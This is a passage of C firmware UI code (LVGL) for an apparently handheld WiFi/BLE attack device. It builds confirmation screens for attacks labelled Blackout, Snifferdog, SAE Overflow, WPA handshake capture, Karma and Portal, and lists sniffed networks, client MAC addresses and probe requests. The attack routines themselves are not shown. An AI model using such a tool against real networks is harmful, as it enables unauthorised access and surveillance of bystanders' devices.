        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
        lv_obj_set_style_pad_all(btn_bar, 4, 0);  // 4px padding
        lv_obj_set_style_pad_gap(btn_bar, 4, 0);  // 4px gap between buttons
        
        // BACK button (48% width to leave room for borders and padding)
        lv_obj_t *back_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(back_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
        lv_obj_set_style_bg_color(back_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
        lv_obj_set_style_border_color(back_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
        lv_obj_set_style_border_width(back_btn, 2, 0);  // 2px border
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "BACK");
        lv_obj_set_style_text_color(back_lbl, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        // YES button (48% width to leave room for borders and padding)
        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(yes_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
        lv_obj_set_style_bg_color(yes_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
        lv_obj_set_style_border_color(yes_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
        lv_obj_set_style_border_width(yes_btn, 2, 0);  // 2px border
        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
        lv_label_set_text(yes_lbl, "YES");
        lv_obj_set_style_text_color(yes_lbl, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_center(yes_lbl);
        lv_obj_add_event_cb(yes_btn, blackout_yes_btn_cb, LV_EVENT_CLICKED, NULL);
        
        return;
    }

    if (strcmp(attack_name, "Snifferdog") == 0) {
        // Show warning page - use base to avoid default center label
        create_function_page_base("Snifferdog");
        
        // Warning message in center
        lv_obj_t *warning_label = lv_label_create(function_page);
        lv_label_set_text(warning_label, "Warning: This will start\nSnifferdog attack.\n\nAre you sure?");
        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_style_text_color(warning_label, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_16, 0);
        lv_obj_center(warning_label);
        
        // Button container at bottom (15px higher)
        lv_obj_t *btn_bar = lv_obj_create(function_page);
        lv_obj_set_size(btn_bar, lv_pct(100), 50);
        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);  // 15px higher
        lv_obj_set_style_bg_color(btn_bar, lv_color_make(0, 0, 0), 0);  // Black background
        lv_obj_set_style_border_width(btn_bar, 0, 0);
        lv_obj_set_style_radius(btn_bar, 0, 0);
        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
        lv_obj_set_style_pad_all(btn_bar, 4, 0);  // 4px padding
        lv_obj_set_style_pad_gap(btn_bar, 4, 0);  // 4px gap between buttons
        
        // BACK button (48% width to leave room for borders and padding)
        lv_obj_t *back_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(back_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
        lv_obj_set_style_bg_color(back_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
        lv_obj_set_style_border_color(back_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
        lv_obj_set_style_border_width(back_btn, 2, 0);  // 2px border
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "BACK");
        lv_obj_set_style_text_color(back_lbl, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        // YES button (48% width to leave room for borders and padding)
        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(yes_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
        lv_obj_set_style_bg_color(yes_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
        lv_obj_set_style_border_color(yes_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
        lv_obj_set_style_border_width(yes_btn, 2, 0);  // 2px border
        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
        lv_label_set_text(yes_lbl, "YES");
        lv_obj_set_style_text_color(yes_lbl, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_center(yes_lbl);
        lv_obj_add_event_cb(yes_btn, snifferdog_yes_btn_cb, LV_EVENT_CLICKED, NULL);
        
        return;
    }

    if (strcmp(attack_name, "Sniffer") == 0) {
        // Show warning page - use base to avoid default center label
        create_function_page_base("Sniffer");
        
        // Warning message in center
        lv_obj_t *warning_label = lv_label_create(function_page);
        lv_label_set_text(warning_label, "This will start\nWiFi Sniffer.\n\nAre you sure?");
        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_style_text_color(warning_label, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_16, 0);
        lv_obj_center(warning_label);
        
        // Button container at bottom (15px higher)
        lv_obj_t *btn_bar = lv_obj_create(function_page);
        lv_obj_set_size(btn_bar, lv_pct(100), 50);
        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);  // 15px higher
        lv_obj_set_style_bg_color(btn_bar, lv_color_make(0, 0, 0), 0);  // Black background
        lv_obj_set_style_border_width(btn_bar, 0, 0);
        lv_obj_set_style_radius(btn_bar, 0, 0);
        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
        lv_obj_set_style_pad_all(btn_bar, 4, 0);  // 4px padding
        lv_obj_set_style_pad_gap(btn_bar, 4, 0);  // 4px gap between buttons
        
        // BACK button (48% width to leave room for borders and padding)
        lv_obj_t *back_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(back_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
        lv_obj_set_style_bg_color(back_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
        lv_obj_set_style_border_color(back_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
        lv_obj_set_style_border_width(back_btn, 2, 0);  // 2px border
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "BACK");
        lv_obj_set_style_text_color(back_lbl, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        // YES button (48% width to leave room for borders and padding)
        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(yes_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
        lv_obj_set_style_bg_color(yes_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
        lv_obj_set_style_border_color(yes_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
        lv_obj_set_style_border_width(yes_btn, 2, 0);  // 2px border
        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
        lv_label_set_text(yes_lbl, "YES");
        lv_obj_set_style_text_color(yes_lbl, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_center(yes_lbl);
        lv_obj_add_event_cb(yes_btn, sniffer_yes_btn_cb, LV_EVENT_CLICKED, NULL);
        
        return;
    }

    if (strcmp(attack_name, "SAE Overflow") == 0) {
        // Show warning page - use base to avoid default center label
        create_function_page_base("SAE Overflow");
        
        // Warning message in center
        lv_obj_t *warning_label = lv_label_create(function_page);
        lv_label_set_text(warning_label, "Warning: This will start\nSAE Overflow attack.\n\nSelect ONE network first.\n\nAre you sure?");
        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_style_text_color(warning_label, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_16, 0);
        lv_obj_center(warning_label);
        
        // Button container at bottom (15px higher)
        lv_obj_t *btn_bar = lv_obj_create(function_page);
        lv_obj_set_size(btn_bar, lv_pct(100), 50);
        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);  // 15px higher
        lv_obj_set_style_bg_color(btn_bar, lv_color_make(0, 0, 0), 0);  // Black background
        lv_obj_set_style_border_width(btn_bar, 0, 0);
        lv_obj_set_style_radius(btn_bar, 0, 0);
        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
        lv_obj_set_style_pad_all(btn_bar, 4, 0);  // 4px padding
        lv_obj_set_style_pad_gap(btn_bar, 4, 0);  // 4px gap between buttons
        
        // BACK button (48% width to leave room for borders and padding)
        lv_obj_t *back_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(back_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
        lv_obj_set_style_bg_color(back_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
        lv_obj_set_style_border_color(back_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
        lv_obj_set_style_border_width(back_btn, 2, 0);  // 2px border
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "BACK");
        lv_obj_set_style_text_color(back_lbl, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        // YES button (48% width to leave room for borders and padding)
        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(yes_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
        lv_obj_set_style_bg_color(yes_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
        lv_obj_set_style_border_color(yes_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
        lv_obj_set_style_border_width(yes_btn, 2, 0);  // 2px border
        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
        lv_label_set_text(yes_lbl, "YES");
        lv_obj_set_style_text_color(yes_lbl, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_center(yes_lbl);
        lv_obj_add_event_cb(yes_btn, sae_overflow_yes_btn_cb, LV_EVENT_CLICKED, NULL);
        
        return;
    }

    if (strcmp(attack_name, "Handshakes") == 0) {
        // Show warning page - use base to avoid default center label
        create_function_page_base("Handshakes");
        
        // Warning message in center
        lv_obj_t *warning_label = lv_label_create(function_page);
        lv_label_set_text(warning_label, "WPA Handshake Capture\n\nSelected networks: Attack those\nNo selection: Scan & attack all\n\nAre you sure?");
        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_style_text_color(warning_label, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_14, 0);
        lv_obj_center(warning_label);
        
        // Button container at bottom (15px higher)
        lv_obj_t *btn_bar = lv_obj_create(function_page);
        lv_obj_set_size(btn_bar, lv_pct(100), 50);
        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);  // 15px higher
        lv_obj_set_style_bg_color(btn_bar, lv_color_make(0, 0, 0), 0);  // Black background
        lv_obj_set_style_border_width(btn_bar, 0, 0);
        lv_obj_set_style_radius(btn_bar, 0, 0);
        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
        lv_obj_set_style_pad_all(btn_bar, 4, 0);  // 4px padding
        lv_obj_set_style_pad_gap(btn_bar, 4, 0);  // 4px gap between buttons
        
        // BACK button (48% width to leave room for borders and padding)
        lv_obj_t *back_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(back_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
        lv_obj_set_style_bg_color(back_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
        lv_obj_set_style_border_color(back_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
        lv_obj_set_style_border_width(back_btn, 2, 0);  // 2px border
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "BACK");
        lv_obj_set_style_text_color(back_lbl, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        // YES button (48% width to leave room for borders and padding)
        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
        lv_obj_set_size(yes_btn, lv_pct(48), LV_SIZE_CONTENT);
        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
        lv_obj_set_style_bg_color(yes_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
        lv_obj_set_style_border_color(yes_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
        lv_obj_set_style_border_width(yes_btn, 2, 0);  // 2px border
        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
        lv_label_set_text(yes_lbl, "YES");
        lv_obj_set_style_text_color(yes_lbl, COLOR_MATERIAL_BLUE, 0);  // Green text
        lv_obj_center(yes_lbl);
        lv_obj_add_event_cb(yes_btn, handshake_yes_btn_cb, LV_EVENT_CLICKED, NULL);
        
        return;
    }

    if (strcmp(attack_name, "Start Wardrive") == 0) {
        // Directly start wardrive - no warning
        create_function_page_base("Wardrive");
        wardrive_start_btn_cb(NULL);
        return;
    }

    if (strcmp(attack_name, "Browse Networks") == 0) {
        // Show last scan results with selection state
        ui_locked = true;
        if (function_page) { lv_obj_del(function_page); function_page = NULL; }
        reset_function_page_children();
        show_function_page("Browse Networks");
        scan_list = lv_list_create(function_page);
        lv_obj_set_size(scan_list, lv_pct(100), LCD_V_RES - 30);
        lv_obj_align(scan_list, LV_ALIGN_BOTTOM_MID, 0, 0);
        lv_obj_set_style_bg_color(scan_list, lv_color_make(18, 18, 18), 0);  // Material Dark #121212
        lv_obj_set_style_text_color(scan_list, lv_color_make(255, 255, 255), 0);  // White text
        // Remove separator lines between items
        lv_obj_set_style_border_width(scan_list, 0, LV_PART_ITEMS);
        lv_obj_set_style_border_color(scan_list, lv_color_make(18, 18, 18), LV_PART_ITEMS);

        uint16_t count = wifi_scanner_get_count();
        if (count == 0) {
            lv_obj_t *msg_label = lv_label_create(scan_list);
            lv_label_set_text(msg_label, "Scan networks first");
            lv_obj_set_style_text_color(msg_label, COLOR_MATERIAL_BLUE, 0);  // Green text
            lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
            lv_obj_center(msg_label);
            return;
        }

        // Fetch last results
        wifi_ap_record_t *records = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * count);
        if (!records) return;
        int got = wifi_scanner_get_results(records, count);

        // Build selected set
        int sel_idx[MAX_SCAN_RESULTS];
        int sel_cnt = wifi_scanner_get_selected(sel_idx, MAX_SCAN_RESULTS);
        // Render rows
        for (int i = 0; i < got; i++) {
            lv_obj_t *row = lv_list_add_btn(scan_list, NULL, "");
            lv_obj_set_width(row, lv_pct(100));
            lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
            lv_obj_set_style_pad_all(row, 8, 0);  // 1.2x bigger (was 6, now 8)
            lv_obj_set_style_pad_gap(row, 10, 0);
            lv_obj_set_height(row, LV_SIZE_CONTENT);
            lv_obj_set_style_bg_color(row, lv_color_make(30, 30, 30), LV_STATE_DEFAULT);  // Material Surface
            lv_obj_set_style_bg_color(row, lv_color_make(50, 50, 50), LV_STATE_PRESSED);  // Lighter on press
            lv_obj_set_style_radius(row, 8, 0);

            lv_obj_t *cb = lv_checkbox_create(row);
            lv_checkbox_set_text(cb, "");
            lv_obj_add_event_cb(cb, scan_checkbox_event_cb, LV_EVENT_VALUE_CHANGED, (void *)(intptr_t)i);
            // Material checkbox styling
            lv_obj_set_style_bg_color(cb, lv_color_make(60, 60, 60), LV_PART_INDICATOR);  // Dark gray unchecked
            lv_obj_set_style_bg_color(cb, lv_color_make(33, 150, 243), LV_PART_INDICATOR | LV_STATE_CHECKED);  // Material Blue checked
            lv_obj_set_style_border_color(cb, lv_color_make(100, 100, 100), LV_PART_INDICATOR);  // Gray border
            lv_obj_set_style_border_width(cb, 2, LV_PART_INDICATOR);
            lv_obj_set_style_radius(cb, 4, LV_PART_INDICATOR);  // Rounded
            lv_obj_set_style_text_color(cb, lv_color_make(255, 255, 255), 0);  // White text
            lv_obj_set_style_pad_all(cb, 6, LV_PART_MAIN);
            // Check if selected
            bool is_selected = false;
            for (int s = 0; s < sel_cnt; s++) { if (sel_idx[s] == i) { is_selected = true; break; } }
            if (is_selected) lv_obj_add_state(cb, LV_STATE_CHECKED);

            lv_obj_t *ssid_lbl = lv_label_create(row);
            char name_buf[128];
            const char *band = (records[i].primary <= 14) ? "2.4GHz" : "5GHz";
            if (records[i].ssid[0] != 0) {
                snprintf(name_buf, sizeof(name_buf), "%s (%s, %02X:%02X:%02X:%02X:%02X:%02X)", 
                         (const char *)records[i].ssid, band,
                         records[i].bssid[0], records[i].bssid[1], records[i].bssid[2],
                         records[i].bssid[3], records[i].bssid[4], records[i].bssid[5]);
            } else {
                snprintf(name_buf, sizeof(name_buf), "%02X:%02X:%02X:%02X:%02X:%02X (%s)",
                         records[i].bssid[0], records[i].bssid[1], records[i].bssid[2],
                         records[i].bssid[3], records[i].bssid[4], records[i].bssid[5], band);
            }
            lv_label_set_text(ssid_lbl, name_buf);
            lv_label_set_long_mode(ssid_lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
            lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_14, 0);
            lv_obj_set_style_text_color(ssid_lbl, lv_color_make(255, 255, 255), 0);  // White text
            lv_obj_align(ssid_lbl, LV_ALIGN_LEFT_MID, 0, 5);  // 5px down for better alignment
            lv_obj_set_width(ssid_lbl, lv_pct(85));

            if ((i & 3) == 3) {
                vTaskDelay(pdMS_TO_TICKS(1));
            }
        }
        lv_mem_free(records);
        ui_locked = false;
        return;
    }

    if (strcmp(attack_name, "Karma") == 0) {
        show_karma_page();
        return;
    }

    if (strcmp(attack_name, "Portal") == 0) {
        show_portal_page();
        return;
    }

    if (strcmp(attack_name, "Browse Clients") == 0) {
        // Show sniffer AP list with clients (indented)
        ui_locked = true;
        if (function_page) { lv_obj_del(function_page); function_page = NULL; }
        reset_function_page_children();
        show_function_page("Browse Clients");
        
        lv_obj_t *list = lv_list_create(function_page);
        lv_obj_set_size(list, lv_pct(100), LCD_V_RES - 30 - 50);
        lv_obj_align(list, LV_ALIGN_TOP_MID, 0, 30);
        lv_obj_set_style_bg_color(list, lv_color_make(0, 0, 0), 0);
        lv_obj_set_style_text_color(list, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_border_width(list, 0, LV_PART_ITEMS);
        lv_obj_set_style_border_color(list, lv_color_make(0, 0, 0), LV_PART_ITEMS);
        
        int ap_count = 0;
        const sniffer_ap_t *aps = wifi_sniffer_get_aps(&ap_count);
        
        if (ap_count == 0 || aps == NULL) {
            lv_obj_t *msg_label = lv_label_create(list);
            lv_label_set_text(msg_label, "No APs sniffed yet.\nRun Sniffer first.");
            lv_obj_set_style_text_color(msg_label, COLOR_MATERIAL_BLUE, 0);
            lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
        } else {
            int displayed_aps = 0;
            for (int i = 0; i < ap_count; i++) {
                const sniffer_ap_t *ap = &aps[i];
                
                // Skip APs with no clients
                if (ap->client_count == 0) {
                    continue;
                }
                
                displayed_aps++;
                
                // AP row (bold/larger)
                lv_obj_t *ap_row = lv_list_add_btn(list, LV_SYMBOL_WIFI, "");
                lv_obj_set_width(ap_row, lv_pct(100));
                lv_obj_set_style_bg_color(ap_row, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
                lv_obj_set_style_pad_all(ap_row, 6, 0);
                
                lv_obj_t *ap_label = lv_label_create(ap_row);
                char ap_text[128];
                if (ap->ssid[0] != '\0') {
                    snprintf(ap_text, sizeof(ap_text), "%s (%02X:%02X:%02X:%02X:%02X:%02X) [%d clients]",
                             ap->ssid, ap->bssid[0], ap->bssid[1], ap->bssid[2],
                             ap->bssid[3], ap->bssid[4], ap->bssid[5], ap->client_count);
                } else {
                    snprintf(ap_text, sizeof(ap_text), "<hidden> (%02X:%02X:%02X:%02X:%02X:%02X) [%d clients]",
                             ap->bssid[0], ap->bssid[1], ap->bssid[2],
                             ap->bssid[3], ap->bssid[4], ap->bssid[5], ap->client_count);
                }
                lv_label_set_text(ap_label, ap_text);
                lv_obj_set_style_text_color(ap_label, COLOR_MATERIAL_BLUE, 0);
                lv_obj_set_style_text_font(ap_label, &lv_font_montserrat_14, 0);
                lv_label_set_long_mode(ap_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
                lv_obj_set_width(ap_label, lv_pct(85));
                
                // Client rows (indented)
                for (int j = 0; j < ap->client_count && j < MAX_CLIENTS_PER_AP; j++) {
                    const sniffer_client_t *client = &ap->clients[j];
                    
                    lv_obj_t *client_row = lv_list_add_btn(list, NULL, "");
                    lv_obj_set_width(client_row, lv_pct(100));
                    lv_obj_set_style_bg_color(client_row, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
                    lv_obj_set_style_pad_left(client_row, 30, 0);  // Indent
                    lv_obj_set_style_pad_all(client_row, 4, 0);
                    
                    lv_obj_t *client_label = lv_label_create(client_row);
                    char client_text[96];
                    snprintf(client_text, sizeof(client_text), "%02X:%02X:%02X:%02X:%02X:%02X (RSSI: %d)",
                             client->mac[0], client->mac[1], client->mac[2],
                             client->mac[3], client->mac[4], client->mac[5], client->rssi);
                    lv_label_set_text(client_label, client_text);
                    lv_obj_set_style_text_color(client_label, lv_color_make(0, 200, 0), 0);  // Slightly dimmer green
                    lv_obj_set_style_text_font(client_label, &lv_font_montserrat_12, 0);  // Smaller font
                    lv_label_set_long_mode(client_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
                    lv_obj_set_width(client_label, lv_pct(80));
                }
                
                // Throttle UI updates every 4 APs
                if ((displayed_aps & 3) == 3) {
                    vTaskDelay(pdMS_TO_TICKS(1));
                }
            }
            
            // If no APs with clients found, show message
            if (displayed_aps == 0) {
                lv_obj_t *msg_label = lv_label_create(list);
                lv_label_set_text(msg_label, "No clients detected yet.\nAPs found but no clients.");
                lv_obj_set_style_text_color(msg_label, COLOR_MATERIAL_BLUE, 0);
                lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
            }
        }
        
        // Back button
        lv_obj_t *back_btn = lv_btn_create(function_page);
        lv_obj_set_size(back_btn, lv_pct(100), 45);
        lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(back_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);
        lv_obj_set_style_border_color(back_btn, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_border_width(back_btn, 3, 0);
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "Back");
        lv_obj_set_style_text_color(back_lbl, COLOR_MATERIAL_BLUE, 0);
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        ui_locked = false;
        return;
    }

    if (strcmp(attack_name, "Show Probes") == 0) {
        // Show probe requests list
        ui_locked = true;
        if (function_page) { lv_obj_del(function_page); function_page = NULL; }
        reset_function_page_children();
        show_function_page("Show Probes");
        
        lv_obj_t *list = lv_list_create(function_page);
        lv_obj_set_size(list, lv_pct(100), LCD_V_RES - 30 - 50);
        lv_obj_align(list, LV_ALIGN_TOP_MID, 0, 30);
        lv_obj_set_style_bg_color(list, lv_color_make(0, 0, 0), 0);
        lv_obj_set_style_text_color(list, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_border_width(list, 0, LV_PART_ITEMS);
        lv_obj_set_style_border_color(list, lv_color_make(0, 0, 0), LV_PART_ITEMS);
        
        int probe_count = 0;
        const probe_request_t *probes = wifi_sniffer_get_probes(&probe_count);
        
        if (probe_count == 0 || probes == NULL) {
            lv_obj_t *msg_label = lv_label_create(list);
            lv_label_set_text(msg_label, "No probes sniffed yet.\nRun Sniffer first.");
            lv_obj_set_style_text_color(msg_label, COLOR_MATERIAL_BLUE, 0);
            lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
        } else {
            for (int i = 0; i < probe_count; i++) {
                const probe_request_t *probe = &probes[i];
                
                lv_obj_t *probe_row = lv_list_add_btn(list, LV_SYMBOL_CALL, "");
                lv_obj_set_width(probe_row, lv_pct(100));
                lv_obj_set_style_bg_color(probe_row, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
                lv_obj_set_style_pad_all(probe_row, 6, 0);
                
                lv_obj_t *probe_label = lv_label_create(probe_row);
                char probe_text[160];
                if (probe->ssid[0] != '\0') {
                    snprintf(probe_text, sizeof(probe_text), "%02X:%02X:%02X:%02X:%02X:%02X \"%s\" (RSSI: %d)",
                             probe->mac[0], probe->mac[1], probe->mac[2],
                             probe->mac[3], probe->mac[4], probe->mac[5],
                             probe->ssid, probe->rssi);
                } else {
                    snprintf(probe_text, sizeof(probe_text), "%02X:%02X:%02X:%02X:%02X:%02X <broadcast> (RSSI: %d)",
                             probe->mac[0], probe->mac[1], probe->mac[2],
                             probe->mac[3], probe->mac[4], probe->mac[5], probe->rssi);
                }
                lv_label_set_text(probe_label, probe_text);
                lv_obj_set_style_text_color(probe_label, COLOR_MATERIAL_BLUE, 0);
                lv_obj_set_style_text_font(probe_label, &lv_font_montserrat_12, 0);
                lv_label_set_long_mode(probe_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
                lv_obj_set_width(probe_label, lv_pct(85));
                
                // Throttle UI updates every 8 probes
                if ((i & 7) == 7) {
                    vTaskDelay(pdMS_TO_TICKS(1));
                }
            }
        }
        
        // Back button
        lv_obj_t *back_btn = lv_btn_create(function_page);
        lv_obj_set_size(back_btn, lv_pct(100), 45);
        lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(back_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);
        lv_obj_set_style_border_color(back_btn, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_border_width(back_btn, 3, 0);
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "Back");
        lv_obj_set_style_text_color(back_lbl, COLOR_MATERIAL_BLUE, 0);
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        ui_locked = false;
        return;
    }

    if (strcmp(attack_name, "BLE Scan") == 0) {
        // BLE Scanner - switch from WiFi to BLE mode and scan
        ui_locked = true;
        if (function_page) { lv_obj_del(function_page); function_page = NULL; }
        reset_function_page_children();
        
        // Create base page
        create_function_page_base("BLE Scan");
        ble_scan_ui_active = true;
        
        // Status label at top (below title bar which is 30px)
        ble_scan_status_label = lv_label_create(function_page);
        lv_label_set_text(ble_scan_status_label, "Initializing BLE...");
        lv_obj_set_style_text_color(ble_scan_status_label, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_text_font(ble_scan_status_label, &lv_font_montserrat_14, 0);
        lv_obj_align(ble_scan_status_label, LV_ALIGN_TOP_LEFT, 5, 0);
        
        // Scrollable list for devices (starts below status label)
        ble_scan_list = lv_obj_create(function_page);
        lv_obj_set_size(ble_scan_list, lv_pct(100), LCD_V_RES - 30 - 50 - 20);  // Leave space for title, status and back button
        lv_obj_align(ble_scan_list, LV_ALIGN_TOP_MID, 0, 20);
        lv_obj_set_style_bg_color(ble_scan_list, lv_color_make(0, 0, 0), 0);
        lv_obj_set_style_border_color(ble_scan_list, lv_color_make(0, 100, 0), 0);
        lv_obj_set_style_border_width(ble_scan_list, 1, 0);
        lv_obj_set_flex_flow(ble_scan_list, LV_FLEX_FLOW_COLUMN);
        lv_obj_set_style_pad_all(ble_scan_list, 4, 0);
